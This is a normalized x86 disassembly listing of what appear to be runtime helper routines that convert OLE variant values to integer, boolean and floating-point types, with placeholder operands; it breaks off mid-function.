mov dx 0x12
mov ax 0x1
call sub_40e520
sub_40fe88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_40ff4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4101d4
test edx edx
je r-xdata
mov al [ eax + lookup_table_40feae ]
jmp [ eax * 4 + jump_table_40fec2 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031d0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e520
sub_40ff70
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402a9c
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40e9b4
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_4107d0
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_41001c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41010a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412798
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404290
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_4081e0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410111
lea eax [ ebp - 0x1c ]
call sub_404008
lea eax [ ebp - 0xc ]
call sub_4046e8
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402a9c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40e9b4
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_4107d0
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_41011c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410173
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f080
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4101d4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41017a
lea eax [ ebp - 0x18 ]
call sub_40ed58
retn
sub_410188
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41426c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4101d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4105e0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410207 ]
mov eax [ ebp - 0x4 ]
call sub_41001c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a9c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a9c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402a9c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a9c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41001c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4101d4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ff70
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41011c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e520
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_410188
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ff70
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_40ff70
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41042b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a9c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a9c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402a9c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a9c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41001c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4101d4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410618
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4106cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412798
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404290
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_4082cc
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4106d6
lea eax [ ebp - 0x10 ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_4046e8
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40e9b4
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40e9b4
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_4106e0
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40e9b4
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410720
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410774
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f080
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_4107d0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41077b
lea eax [ ebp - 0x11 ]
call sub_40ed58
retn
sub_410784
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41426c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_4107d0
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4107ea ]
mov eax ebx
call sub_410618
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410618
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_4107d0
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_4106e0
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410720
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e520
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410784
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4106e0
mov [ esp ] al
mov eax ebx
call sub_4106e0
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_4109ac ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410618
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_4107d0
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410b24
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410bd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412798
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404290
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_40948c
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40e9b4
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40e9b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410be0
lea eax [ ebp - 0x1c ]
call sub_404008
lea eax [ ebp - 0xc ]
call sub_4046e8
retn
sub_410be8
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40e9b4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_410c34
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410c89
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f080
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410ce4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c90
lea eax [ ebp - 0x18 ]
call sub_40ed58
retn
sub_410c98
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41426c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410ce4
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410d00 ]
mov eax ebx
call sub_410b24
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410b24
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410ce4
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410be8
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_410c34
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e520
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410c98
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410be8
fstp [ esp ]
fwait
mov eax ebx
call sub_410be8
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410edd ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410b24
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410ce4
fstp [ esp ]
fwait
jmp r-xdata
sub_41107c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_4111e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410ce4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41109e ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e520
sub_41120c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4112e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412798
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
